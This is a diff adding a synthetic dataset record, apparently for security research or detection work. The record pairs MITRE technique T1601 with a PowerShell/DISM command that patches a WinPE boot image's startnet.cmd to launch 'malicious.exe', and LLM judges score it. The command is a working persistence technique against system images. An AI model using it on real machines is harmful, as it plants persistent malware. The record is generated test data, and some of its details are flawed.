@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\boot.wim /Index:2 /MountDir:C:\\Mount\\Boot; Add-Content -Path C:\\Mount\\Boot\\Windows\\System32\\startnet.cmd -Value 'start \"\" X:\\Windows\\System\\32\\malicious.exe'; dism /Unmount-Wim /MountDir:C:\\Mount\\Boot /Commit; Get-FileHash C:\\Images\\boot.wim -Algorithm SHA256; fc /b C:\\Images\\boot_clean.wim C:\\Images\\boot.wim",
+  "explanation": "Patches the Windows PE boot image by altering startnet.cmd to launch a payload, then verifies the integrity shift through hashing and binary diff.",
+  "rationale_steps": [
+    "Mount boot.wim index 2 (WinPE) with DISM.",
+    "Modify startup script to persist a payload within the system image.",
+    "Commit changes and unmount to save the patched boot image.",
+    "Verify modifications via checksum and fc binary comparison."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-596528e3",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators, balanced quotes, valid flags for DISM and PowerShell cmdlets, and correct path specifications.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by mounting a Windows boot image, modifying it to include malicious code in the startup sequence, committing changes, and then verifying the modification through hash comparison and binary diff.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T18:13:32.882185Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are correctly separated by semicolons with valid DISM and PowerShell parameter syntax and balanced quoting for the embedded start command.",
+        "semantic_score": 4,
+        "semantic_justification": "It properly mounts and modifies a boot WIM to alter startnet.cmd and commits changes with integrity checks, but the payload path uses 'System\\32' instead of 'System32' and the claim of no required privileges is unrealistic for DISM operations.",
+        "combined_score": 4.5,
+        "confidence": 0.84,
+        "timestamp": "2025-10-02T18:13:55.747432Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct command syntax for DISM, PowerShell cmdlets, and native Windows commands, along with proper command separators and balanced quoting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the sequence of commands is semantically appropriate for mounting, modifying, committing changes to a WIM, and verifying integrity shifts for T1601, the stated 'Privilege: None' makes the core modification steps (dism mount/unmount commit, and writing to the mounted image) operationally infeasible, preventing the command from achieving its claimed intent of patching the image.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:13:59.662370Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
